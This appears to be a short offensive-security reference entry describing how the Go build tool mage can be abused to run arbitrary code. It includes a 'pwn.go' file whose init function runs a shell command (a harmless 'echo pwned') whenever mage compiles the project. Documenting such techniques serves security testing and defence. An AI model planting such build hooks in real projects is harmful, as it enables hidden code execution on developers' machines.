---
title: mage
tags:
- cli
- config-file
- eval-go
references:
- https://github.com/magefile/mage
- https://magefile.org/magefiles/
---

`mage` is a make/rake-like build tool that uses plain go functions as runnable targets.

## Magefiles

To invoke a given target, `mage` compiles the current Go project with the **mage** build target.

If we can modify any file, we can simply add our code in any target in the current magefile.

If we _can't_ modify the current magefile, we can add a new Go file containing our code in the working directory with the **mage** build target. Our code can then be placed in the `init` function.

#### pwn.go

```go
//go:build mage

package main

import (
	exec "os/exec"
)

func init() {
	exec.Command("/bin/bash", "-c", "echo pwned").Run()
}
```